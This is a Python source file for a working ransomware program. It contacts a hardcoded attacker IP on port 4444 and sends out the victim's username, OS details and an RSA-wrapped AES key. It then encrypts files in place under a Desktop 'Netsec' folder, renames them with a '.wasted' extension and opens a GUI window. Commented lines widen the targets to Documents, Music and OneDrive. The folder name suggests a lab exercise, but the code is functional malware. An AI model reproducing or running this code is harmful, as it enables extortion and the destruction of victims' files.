from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA

import argparse
import os
import sys
import base64
import platform 
import getpass
import socket
import base64

import discover
import modify
from gui import MainWindow


extension = ".wasted" # Ransomware custom extension

def connect_and_exchange_key(attacker_ip, attacker_port=4444):
    try:
        s = socket.socket()
        s.connect((attacker_ip, attacker_port))

        # Step 1: Receive RSA public key
        rsa_key_data = s.recv(2048)
        server_key = RSA.import_key(rsa_key_data)

        # Step 2: Generate AES key
        aes_key = get_random_bytes(32)

        encryptor = PKCS1_OAEP.new(server_key)
        encrypted_key = encryptor.encrypt(aes_key)
        encrypted_key_b64 = base64.b64encode(encrypted_key).decode()

        # Step 3: Send victim info
        info = f"""
User: {getpass.getuser()}
System: {platform.system()} {platform.release()}
Encrypted AES Key:
{encrypted_key_b64}
"""
        s.send(info.encode())
        s.close()

        return aes_key, encrypted_key_b64

    except Exception as e:
        print(f"[!] Failed to connect to attacker server: {e}")
        exit(1)


def main():
    print('[*] Ransomware\n')
    attacker_ip = "192.168.1.187"  # 🔁 Replace this with your actual IP
    key, encrypted_key_b64 = connect_and_exchange_key(attacker_ip)
    plt = platform.system()
    if plt == "Linux" or plt == "Darwin":
     startdirs = [os.environ['HOME'] + '/Desktop/Netsec']
    elif plt == "Windows":
      startdirs = [os.environ['USERPROFILE'] + '\\Desktop\\Netsec']
        # Can also hardcode additional directories
        # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
        # os.environ['USERPROFILE'] + '\\Documents',
        # os.environ['USERPROFILE'] + '\\Music',
        # os.environ['USERPROFILE'] + '\\Desktop',
        # os.environ['USERPROFILE'] + '\\Onedrive']
    else:
        print("Unidentified system")
        exit(0)   

    # Create AES counter and AES cipher
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    # Recursively go through folders and encrypt/decrypt files
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            if not file.endswith(extension):
                modify.modify_file_inplace(file, crypt.encrypt)
                os.rename(file, file + extension)
                print("File changed from " + file + " to " + file + extension)
       
    main = MainWindow(encrypted_key_b64)
    main.mainloop()
if __name__=="__main__":
    main()
